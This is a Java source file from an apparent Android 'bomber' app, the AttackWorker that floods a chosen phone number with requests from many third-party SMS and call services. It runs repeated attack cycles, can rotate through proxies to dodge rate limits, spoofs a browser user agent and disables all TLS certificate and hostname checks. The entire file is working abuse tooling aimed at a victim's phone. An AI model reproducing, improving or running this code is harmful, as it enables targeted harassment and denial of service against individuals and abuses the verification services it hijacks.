package com.dm.bomber.worker;

import android.Manifest;
import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.TaskStackBuilder;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;
import androidx.core.app.NotificationManagerCompat;
import androidx.work.Data;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.dm.bomber.R;
import com.dm.bomber.services.MainServices;
import com.dm.bomber.services.core.Callback;
import com.dm.bomber.services.core.Phone;
import com.dm.bomber.services.core.Service;
import com.dm.bomber.ui.MainActivity;
import com.dm.bomber.ui.MainRepository;
import com.dm.bomber.ui.MainViewModel;
import com.dm.bomber.ui.Repository;

import org.jetbrains.annotations.NotNull;

import java.io.IOException;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;

import okhttp3.Call;
import okhttp3.OkHttpClient;
import okhttp3.Response;

public class AttackWorker extends Worker {

    private static final String TAG = "Attack";

    private static final String USER_AGENT = "Mozilla/5.0 (Linux; Android 6.0.1; SM-G928T Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/268.1.0.54.121;]";

    public static final String KEY_COUNTRY_CODE = "country_code";
    public static final String KEY_PHONE = "phone";
    public static final String KEY_REPEATS = "repeats";
    public static final String KEY_PROXY_ENABLED = "proxy_enabled";

    private static final String CHANNEL_ID = "attack";

    private static final int CHUNK_SIZE = 4;

    private int progress = 0;

    private CountDownLatch tasks;

    private boolean notificationsGranted = true;

    @SuppressLint({"CustomX509TrustManager", "TrustAllX509TrustManager"})
    private final TrustManager[] trustAllCerts = new TrustManager[]{
            new X509TrustManager() {
                @Override
                public void checkClientTrusted(java.security.cert.X509Certificate[] chain, String authType) {
                }

                @Override
                public void checkServerTrusted(java.security.cert.X509Certificate[] chain, String authType) {
                }

                @Override
                public java.security.cert.X509Certificate[] getAcceptedIssuers() {
                    return new java.security.cert.X509Certificate[]{};
                }
            }
    };

    private static final OkHttpClient.Builder clientBuilder = new OkHttpClient.Builder()
            .callTimeout(7, TimeUnit.SECONDS)
            .addInterceptor(new UserAgentInterceptor(USER_AGENT))
            .addInterceptor(new LoggingInterceptor())
            .addInterceptor(chain -> {
                try {
                    return chain.proceed(chain.request());
                } catch (Exception e) {
                    throw new IOException(e.getMessage());
                }
            });


    public AttackWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);

        setProgressAsync(new Data.Builder()
                .putInt(MainViewModel.KEY_PROGRESS, 0)
                .putInt(MainViewModel.KEY_MAX_PROGRESS, 0)
                .build());
    }

    @NonNull
    @Override
    public Result doWork() {
        Repository repository = new MainRepository(getApplicationContext());

        try {
            SSLContext sslContext = SSLContext.getInstance("SSL");
            sslContext.init(null, trustAllCerts, new java.security.SecureRandom());

            clientBuilder.sslSocketFactory(sslContext.getSocketFactory(), (X509TrustManager) trustAllCerts[0]);
            clientBuilder.hostnameVerifier((hostname, session) -> true);
        } catch (KeyManagementException | NoSuchAlgorithmException e) {
            e.printStackTrace();
        }

        OkHttpClient client = clientBuilder.build();

        List<AuthableProxy> proxies = getInputData().getBoolean(KEY_PROXY_ENABLED, false) ?
                repository.getProxy() : new ArrayList<>();

        Phone phone = new Phone(
                getInputData().getString(KEY_COUNTRY_CODE),
                getInputData().getString(KEY_PHONE));

        int repeats = getInputData().getInt(KEY_REPEATS, 1);

        MainServices services = new MainServices();
        services.setRepositories(repository.getAllRepositories(client));
        services.collectAll();

        List<Service> usableServices = services.getServices(phone);

        Bundle params = new Bundle();
        params.putInt("repeats", repeats);
        params.putString("phone_number", phone.toString());
        params.putBoolean("proxy_enabled", getInputData().getBoolean(KEY_PROXY_ENABLED, false));
        params.putInt("proxy_count", proxies.size());
        params.putInt("services_count", usableServices.size());

        Log.i(TAG, "Starting attack on +" + phone);

        client = client.newBuilder()
                .proxy(null)
                .build();

        NotificationManagerCompat notificationManager = NotificationManagerCompat.from(getApplicationContext());

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
            notificationsGranted = ActivityCompat.checkSelfPermission(getApplicationContext(), Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            CharSequence name = getApplicationContext().getString(R.string.attack);
            String description = getApplicationContext().getString(R.string.channel_description);

            int importance = NotificationManager.IMPORTANCE_LOW;

            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, name, importance);
            channel.setDescription(description);

            notificationManager.createNotificationChannel(channel);
        }

        for (int cycle = 0; cycle < repeats; cycle++) {
            Log.i(TAG, "Started cycle " + cycle);

            if (!proxies.isEmpty()) {
                AuthableProxy authableProxy = proxies.get(cycle % proxies.size());

                client = client.newBuilder()
                        .proxy(authableProxy)
                        .proxyAuthenticator(authableProxy)
                        .build();
            }

            for (int index = 0; index < usableServices.size(); index++) {
                Service service = usableServices.get(index);

                if (index % CHUNK_SIZE == 0) {
                    if (tasks != null)
                        try {
                            tasks.await();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }

                    tasks = new CountDownLatch(
                            Math.min(usableServices.size() - index, CHUNK_SIZE));
                }

                if (isStopped()) {
                    cycle = repeats;
                    break;
                }

                service.run(client, new Callback() {
                    @Override
                    public void onError(@NotNull Call call, @NotNull Exception e) {
                        Log.e(TAG, "An error occurred during the call " + call, e);
                        tasks.countDown();
                    }

                    @SuppressLint("MissingPermission")
                    @Override
                    public void onResponse(@NotNull Call call, @NotNull Response response) {
                        Intent intent = new Intent(getApplicationContext(), MainActivity.class);
                        intent.putExtra(MainActivity.TASK_ID, getId().toString());

                        TaskStackBuilder stackBuilder = TaskStackBuilder.create(getApplicationContext());
                        stackBuilder.addParentStack(MainActivity.class);
                        stackBuilder.addNextIntent(intent);

                        PendingIntent pendingIntent = stackBuilder.getPendingIntent(0,
                                android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.M ? PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE : PendingIntent.FLAG_UPDATE_CURRENT);

                        Notification notification = new NotificationCompat.Builder(getApplicationContext(), CHANNEL_ID)
                                .setContentTitle(getApplicationContext().getString(R.string.attack))
                                .setContentText("+" + phone)
                                .setProgress(usableServices.size() * repeats, progress, false)
                                .setOngoing(true)
                                .setSmallIcon(R.drawable.logo)
                                .setPriority(NotificationCompat.PRIORITY_HIGH)
                                .addAction(R.drawable.logo, getApplicationContext().getString(R.string.stop), pendingIntent)
                                .build();

                        notification.flags |= Notification.FLAG_ONGOING_EVENT;

                        if (notificationsGranted)
                            notificationManager.notify(getId().hashCode(), notification);

                        setProgressAsync(new Data.Builder()
                                .putInt(MainViewModel.KEY_PROGRESS, progress++)
                                .putInt(MainViewModel.KEY_MAX_PROGRESS, usableServices.size() * repeats)
                                .build());

                        tasks.countDown();
                    }
                }, phone);
            }
        }

        try {
            if (!isStopped())
                tasks.await();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }

        notificationManager.cancel(getId().hashCode());

        Log.i(TAG, "Attack ended +" + phone);
        return Result.success();
    }
}
